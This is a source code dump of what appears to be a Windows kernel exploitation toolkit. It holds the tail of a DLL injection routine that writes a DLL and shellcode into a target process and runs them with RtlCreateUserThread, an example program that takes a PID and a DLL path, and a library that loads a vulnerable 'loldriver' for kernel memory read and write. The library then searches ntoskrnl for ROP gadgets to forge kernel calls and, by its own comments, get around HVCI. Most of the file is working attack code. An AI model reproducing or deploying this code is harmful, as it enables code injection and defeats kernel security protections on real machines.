        DbgMsg(__FILE__, __LINE__, "ERROR: LdrProcessRelocs() fails\n");
        goto _end;
    }

    // set proper size once again, ZwAllocateVirtualMemory() may round it
    ImageSize = dwImageSize;    

    PVOID Args_3[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(ImageAddr),                   // BaseAddress
                       KF_ARG(Image),                       // Buffer
                       KF_ARG(ImageSize),                   // NumberOfBytesToWrite
                       KF_ARG(NULL) };                      // NumberOfBytesWritten

    // write DLL image into the process memory
    if (!KfCall("ZwWriteVirtualMemory", Args_3, 5, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ZwWriteVirtualMemory() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    PVOID Args_4[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(&ShellcodeAddr),              // BaseAddress
                       KF_ARG(0),                           // ZeroBits
                       KF_ARG(&InjectStructSize),           // RegionSize
                       KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
                       KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect

    // allocate memory for the shellcode
    if (!KfCall("ZwAllocateVirtualMemory", Args_4, 6, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ZwAllocateVirtualMemory() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, "Shellcode memory was allocated at "IFMT"\n", ShellcodeAddr);

    // set proper size once again, ZwAllocateVirtualMemory() may round it
    InjectStructSize = dwInjectStructSize;
    InjectStruct->ModuleBase = ImageAddr;

    PVOID Args_5[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(ShellcodeAddr),               // BaseAddress
                       KF_ARG(InjectStruct),                // Buffer
                       KF_ARG(InjectStructSize),            // NumberOfBytesToWrite
                       KF_ARG(NULL) };                      // NumberOfBytesWritten

    // write shellcode into the process memory
    if (!KfCall("ZwWriteVirtualMemory", Args_5, 5, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ZwWriteVirtualMemory() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    PVOID StartAddress = RVATOVA(ShellcodeAddr, FIELD_OFFSET(DLL_INJECT_STRUCT, Shellcode));

    PVOID Args_6[] = { KF_ARG(hProcess),                    // ProcessHandle
                       KF_ARG(NULL),                        // SecurityDescriptor
                       KF_ARG(FALSE),                       // CreateSuspended
                       KF_ARG(0),                           // StackZeroBits
                       KF_ARG(NULL),                        // StackReserved
                       KF_ARG(NULL),                        // StackCommit
                       KF_ARG(StartAddress),                // StartAddress 
                       KF_ARG(ShellcodeAddr),               // StartParameter
                       KF_ARG(&hThread),                    // ThreadHandle
                       KF_ARG(&ClientId) };                 // ClientId

    // create new thread to execute DLL load shellcode
    if (!KfCall("RtlCreateUserThread", Args_6, 10, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "RtlCreateUserThread() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    if (hThread)
    {
        PVOID Args[] = { KF_ARG(hThread) };

        // close created thread handle
        if (KfCall("ZwClose", Args, 1, KF_RET(&Status)))
        {
            if (NT_ERROR(Status))
            {
                DbgMsg(__FILE__, __LINE__, "ZwClose() ERROR 0x%.8x\n", Status);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        }
    }

    bRet = TRUE;

_end:

    if (hProcess)
    {
        PVOID Args[] = { KF_ARG(hProcess) }; 

        // close target process handle
        if (KfCall("ZwClose", Args, 1, KF_RET(&Status)))
        {
            if (NT_ERROR(Status))
            {
                DbgMsg(__FILE__, __LINE__, "ZwClose() ERROR 0x%.8x\n", Status);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        }
    }

    if (NT_ERROR(Status))
    {
        // perform cleanup on error
        if (ShellcodeAddr)
        {
            PVOID Args[] = { KF_ARG(hProcess),              // ProcessHandle
                             KF_ARG(&ShellcodeAddr),        // BaseAddress
                             KF_ARG(&InjectStructSize),     // RegionSize
                             KF_ARG(MEM_RELEASE) };         // FreeType

            // free shellcode memory
            if (KfCall("ZwFreeVirtualMemory", Args, 4, KF_RET(&Status)))
            {
                if (NT_ERROR(Status))
                {
                    DbgMsg(__FILE__, __LINE__, "ZwFreeVirtualMemory() ERROR 0x%.8x\n", Status);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
            }
        }

        if (ImageAddr)
        {
            PVOID Args[] = { KF_ARG(hProcess),              // ProcessHandle
                             KF_ARG(&ImageAddr),            // BaseAddress
                             KF_ARG(&ImageSize),            // RegionSize
                             KF_ARG(MEM_RELEASE) };         // FreeType

            // free DLL image memory
            if (KfCall("ZwFreeVirtualMemory", Args, 4, KF_RET(&Status)))
            {
                if (NT_ERROR(Status))
                {
                    DbgMsg(__FILE__, __LINE__, "ZwFreeVirtualMemory() ERROR 0x%.8x\n", Status);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
            }
        }        
    }

    if (InjectStruct)
    {
        M_FREE(InjectStruct);
    }

    if (Image)
    {
        M_FREE(Image);
    }    

    return bRet;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{   
    int Ret = -1;

    if (argc < 3)
    {
        printf("USAGE: kforge_example.exe <PID> <DLL_path>\n");
        return -1;
    }

    HANDLE ProcessId = 0;
    char *lpszPath = argv[2];

    // read target process id
    if (!StrToIntEx(argv[1], 0, (int *)&ProcessId))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Invalid PID\n");
        return -1;
    }

    DbgMsg(__FILE__, __LINE__, "Target process PID = %I64d\n", ProcessId);

    PVOID Data = NULL;
    DWORD dwDataSize = 0;

    // read DLL image file contents
    if (!ReadFromFile(lpszPath, &Data, &dwDataSize))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't read DLL image file\n");
        return -1;
    }

    DbgMsg(__FILE__, __LINE__, "%d bytes of DLL image read from %s\n", dwDataSize, lpszPath);    

    // initialize kernel forge library
    if (KfInit())
    {
        // perform DLL injection
        if (DllInject(ProcessId, Data, dwDataSize))
        {
            DbgMsg(__FILE__, __LINE__, "DLL was successfully injected!\n");

            Ret = 0;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: DllInject() fails\n");
        }

        // uninitialize the library
        KfUninit();
    }

    M_FREE(Data);    

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF

```

`kforge_example/kforge_example.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{FD13CD14-B412-45BD-A3C9-7466CD83CAFC}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>kforge_example</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <AdditionalDependencies>..\kforge_driver.lib;..\kforge_library.lib;shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalOptions>/ORDER:@func_order.txt %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
      <AdditionalDependencies>..\kforge_driver.lib;..\kforge_library.lib;shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalOptions>/ORDER:@func_order.txt %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h" />
    <ClInclude Include="..\common\debug.h" />
    <ClInclude Include="..\common\ntdll_defs.h" />
    <ClInclude Include="..\common\ntdll_undocnt.h" />
    <ClInclude Include="..\common\peimage.h" />
    <ClInclude Include="..\dll_inject_shellcode.h" />
    <ClInclude Include="..\include\kforge_driver.h" />
    <ClInclude Include="..\include\kforge_library.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\dll_inject_shellcode.cpp" />
    <ClCompile Include="kforge_example.cpp" />
    <ClCompile Include="stdafx.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kforge_example/kforge_example.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Header Files\common">
      <UniqueIdentifier>{038edea2-18f0-4bf7-9ac2-06360787398b}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\common.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\debug.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_defs.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_undocnt.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\include\kforge_driver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\include\kforge_library.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\peimage.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\dll_inject_shellcode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kforge_example.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\dll_inject_shellcode.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`kforge_example/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// kforge.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file

```

`kforge_example/stdafx.h`:

```h
#pragma once
#pragma warning(disable: 4200)
#pragma warning(disable: 4996)

#include "targetver.h"

#include <stdio.h>
#include <tchar.h>
#include <conio.h>

#include <Windows.h>
#include <sddl.h>
#include <Shlwapi.h>

#include "common/ntdll_defs.h"
#include "common/ntdll_undocnt.h"
#include "common/common.h"
#include "common/debug.h"
#include "common/peimage.h"

#include "include/kforge_library.h"

#include "dll_inject_shellcode.h"

```

`kforge_example/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`kforge_library/kforge_library.cpp`:

```cpp
#include "stdafx.h"

// StackBase and KernelStack field offset
#define KTHREAD_StackBase    0x38
#define KTHREAD_KernelStack  0x58

// magic exit code for DummyThread()
#define THREAD_EXIT_CODE 0x1337

static BOOL m_bInitialized = FALSE;

// kernel image name and memory location
static DWORD m_dwKernelSize = 0;
static DWORD_PTR m_KernelAddr = NULL;

// userland copy of the kernel image
static PVOID m_KernelImage = NULL;
static DWORD m_dwKernelImageSize = NULL;

// mandatory function
static PVOID m_ZwTerminateThread = NULL;

// ROP gadgets used to forge function calls
static PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL;
static PVOID m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;
//--------------------------------------------------------------------------------------
static BOOL MemReadPtr(PVOID Addr, PVOID *Value)
{
    // read single pointer from virtual memory address
    return DriverMemRead(Addr, Value, sizeof(PVOID));
}

static BOOL MemWritePtr(PVOID Addr, PVOID Value)
{
    // write single pointer at virtual memory address
    return DriverMemWrite(Addr, &Value, sizeof(PVOID));
}
//--------------------------------------------------------------------------------------
static BOOL MatchSign(PUCHAR Data, PUCHAR Sign, int Size)
{
    for (int i = 0; i < Size; i += 1)
    {
        if (Sign[i] == 0xff)
        {
            // 0xff means to match any value
            continue;
        }

        if (Sign[i] != Data[i])
        {
            // not matched
            return FALSE;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
static BOOL KfGetKernelImageInfo(PVOID *pImageAddress, PDWORD pdwImageSize, char *lpszName)
{
    // query loaded kernel modules information
    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSystemInformation(SystemModuleInformation);
    if (Info && Info->NumberOfModules > 0)
    {
        // kernel usually goes first: this might be not very reliable, idk
        PRTL_PROCESS_MODULE_INFORMATION Module = &Info->Modules[0];

        // return image load address and size
        *pImageAddress = Module->ImageBase;
        *pdwImageSize = Module->ImageSize;

        // get kernel file name from NT path
        strcpy_s(lpszName, MAX_PATH, (char *)(Module->FullPathName + Module->OffsetToFileName));

        M_FREE(Info);

        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL KfGetSyscallNumber(char *lpszProcName, PDWORD pdwRet)
{
    // get ntdll image address
    HMODULE hImage = GetModuleHandle("ntdll.dll");
    if (hImage == NULL)
    {
        return FALSE;
    }

    // get syscall stub address
    PUCHAR Addr = (PUCHAR)GetProcAddress(hImage, lpszProcName);
    if (Addr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find %s()\n", lpszProcName);
        return FALSE;
    }

    // check for mov eax, imm32 instruction
    if (*(Addr + 3) == 0xb8)
    {
        // return instruction argument, syscall number
        *pdwRet = *(PDWORD)(Addr + 4);
        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unexpected code for %s()\n", lpszProcName);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
PVOID KfGetKernelProcAddress(char *lpszProcName)
{
    if (m_KernelImage == NULL || m_KernelAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // get RVA of the target function
    DWORD Offset = LdrGetProcAddress(m_KernelImage, lpszProcName);
    if (Offset != 0)
    {
        // return an actual address of the target function
        return RVATOVA(m_KernelAddr, Offset);
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID KfGetKernelZwProcAddress(char *lpszProcName)
{
    PVOID Addr = NULL;
    DWORD dwSyscallNumber = 0;

    if (m_KernelImage == NULL || m_KernelAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // get target function syscall number
    if (!KfGetSyscallNumber(lpszProcName, &dwSyscallNumber))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: KfGetSyscallNumber() fails\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_KernelImage, ((PIMAGE_DOS_HEADER)m_KernelImage)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        // check for the code sectin
        if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
        {
            for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
            {                            
                DWORD Ptr = pSection->VirtualAddress + n;

                /*
                    Signature of Zw stub to call system calls from kernel drivers.
                */
                UCHAR Sign[] = "\x48\x8B\xC4"                  // mov     rax, rsp
                               "\xFA"                          // cli
                               "\x48\x83\xEC\x10"              // sub     rsp, 10h
                               "\x50"                          // push    rax
                               "\x9C"                          // pushfq
                               "\x6A\x10"                      // push    10h
                               "\x48\x8D\x05\xFF\xFF\xFF\xFF"  // lea     rax, KiServiceLinkage
                               "\x50"                          // push    rax
                               "\xB8\x00\x00\x00\x00"          // mov     eax, XXXXXXXX
                               "\xE9\xFF\xFF\xFF\xFF";         // jmp     KiServiceInternal

                *(PDWORD)(Sign + 0x15) = dwSyscallNumber;

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign, sizeof(Sign)-1))
                {
                    // calculate an actual kernel address
                    Addr = RVATOVA(m_KernelAddr, Ptr);
                }
            }
        }

        pSection += 1;
    }

    return Addr;
}
//--------------------------------------------------------------------------------------
BOOL KfInit(void)
{
    char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

    if (m_bInitialized)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Already initialized\n");
        return TRUE;
    }

    GET_NATIVE(RtlGetVersion);

    if (f_RtlGetVersion == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to obtain needed functions\n");
        return FALSE;
    }

    RTL_OSVERSIONINFOW VersionInfo;
    VersionInfo.dwOSVersionInfoSize = sizeof(VersionInfo);

    if (NT_ERROR(f_RtlGetVersion(&VersionInfo)))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: RtlGetVersion() fails\n");
        return FALSE;
    }

    // check for the proper NT version
    if (!(VersionInfo.dwMajorVersion == 10 && VersionInfo.dwBuildNumber >= 1709))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Unsupported NT version\n");
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Well, maybe it's actually supported but it has "
                                                   "no HVCI so there's no sense to use this project\n");
        return FALSE;
    }

    DbgMsg(
        __FILE__, __LINE__, "NT version: %d.%d.%d\n", 
        VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber
    );

    // load loldriver
    if (!DriverInit())
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverInit() fails\n");
        goto _end;
    }    

    // get kernel address
    if (!KfGetKernelImageInfo((PVOID *)&m_KernelAddr, &m_dwKernelSize, szKernelName))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetKernelImageInfo() fails\n");
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, "Kernel is at "IFMT", image size is 0x%x\n", m_KernelAddr, m_dwKernelSize);      

    GetSystemDirectory(szKernelPath, MAX_PATH);
    strcat_s(szKernelPath, "\\");
    strcat_s(szKernelPath, szKernelName);

    PVOID Data = NULL;
    DWORD dwDataSize = 0;

    if (ReadFromFile(szKernelPath, &Data, &dwDataSize))
    {
        // load kernel image into the userland
        if (LdrMapImage(Data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize))
        {
            // relocate kernel image to its actual address
            LdrProcessRelocs(m_KernelImage, (PVOID)m_KernelAddr);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrMapImage() fails\n");
        }

        M_FREE(Data);
    }    
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: ReadFromFile() fails\n");
        goto _end;
    }

    if (m_KernelImage == NULL)
    {
        goto _end;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(m_KernelImage, ((PIMAGE_DOS_HEADER)m_KernelImage)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        // check for the code sectin
        if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0)
        {
            for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; n += 1)
            {
                DWORD Ptr = pSection->VirtualAddress + n;

                /*
                    Signature of nt!_guard_retpoline_exit_indirect_rax() used as
                    ROP gadget to control function argument registers
                */
                UCHAR Sign_1[] = "\x48\x8b\x44\x24\x20"          // mov     rax, [rsp+0x20]
                                 "\x48\x8b\x4c\x24\x28"          // mov     rcx, [rsp+0x28]
                                 "\x48\x8b\x54\x24\x30"          // mov     rdx, [rsp+0x30]
                                 "\x4c\x8b\x44\x24\x38"          // mov     r8, [rsp+0x38]
                                 "\x4c\x8b\x4c\x24\x40"          // mov     r9, [rsp+0x40] 
                                 "\x48\x83\xC4\x48"              // add     rsp, 48h
                                 "\x48\xFF\xE0";                 // jmp     rax

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_1, sizeof(Sign_1)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_1 = RVATOVA(m_KernelAddr, Ptr);
                }

                /*
                    ROP gadget used to reserve an extra space for the stack arguments
                */
                UCHAR Sign_2[] = "\x48\x83\xC4\x68"              // add     rsp, 68h
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_2, sizeof(Sign_2)-1))
                {
                    // calculate an actual kernel address                        
                    m_RopAddr_2 = RVATOVA(m_KernelAddr, Ptr);
                }
                    
                /*
                    RCX control ROP gadget to use in pair with the next one
                */
                UCHAR Sign_3[] = "\x59"                          // pop     rcx
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_3, sizeof(Sign_3)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_3 = RVATOVA(m_KernelAddr, Ptr);
                }

                /*
                    ROP gadget used to save forged functoin call return value
                */
                UCHAR Sign_4[] = "\x48\x89\x01"                  // mov     [rcx], rax
                                 "\xC3";                         // retn

                // match the signature
                if (MatchSign(RVATOVA(m_KernelImage, Ptr), Sign_4, sizeof(Sign_4)-1))
                {
                    // calculate an actual kernel address
                    m_RopAddr_4 = RVATOVA(m_KernelAddr, Ptr);

                    // dummy dagdet for stack alignment
                    m_RopAddr_5 = RVATOVA(m_KernelAddr, Ptr + 3);
                }
            }
        }

        pSection += 1;
    }

    if (m_RopAddr_1 == NULL || m_RopAddr_2 == NULL ||
        m_RopAddr_3 == NULL || m_RopAddr_4 == NULL || m_RopAddr_5 == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find needed ROP gadgets\n");
        goto _end;
    }    

    DbgMsg(__FILE__, __LINE__, "ROP gadget #1 is at "IFMT"\n", m_RopAddr_1);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #2 is at "IFMT"\n", m_RopAddr_2);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #3 is at "IFMT"\n", m_RopAddr_3);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #4 is at "IFMT"\n", m_RopAddr_4);
    DbgMsg(__FILE__, __LINE__, "ROP gadget #5 is at "IFMT"\n", m_RopAddr_5);

    /*
        Get address of nt!ZwTerminateThread(), we need this function
        to gracefully shutdown our dummy thread with fucked up kernel stack
    */
    if ((m_ZwTerminateThread = KfGetKernelZwProcAddress("ZwTerminateThread")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find nt!ZwTerminateThread() address\n");
        goto _end;
    }    

    DbgMsg(__FILE__, __LINE__, "nt!ZwTerminateThread() is at "IFMT"\n", m_ZwTerminateThread);

    m_bInitialized = TRUE;

_end:

    if (!m_bInitialized)
    {
        if (m_KernelImage)
        {
            M_FREE(m_KernelImage);

            m_KernelImage = NULL;
            m_dwKernelImageSize = 0;
        }

        // unload loldriver in case of error
        DriverUninit();        
    }

    return m_bInitialized;
}
//--------------------------------------------------------------------------------------
BOOL KfUninit(void)
{    
    if (m_KernelImage)
    {
        M_FREE(m_KernelImage);

        m_KernelImage = NULL;
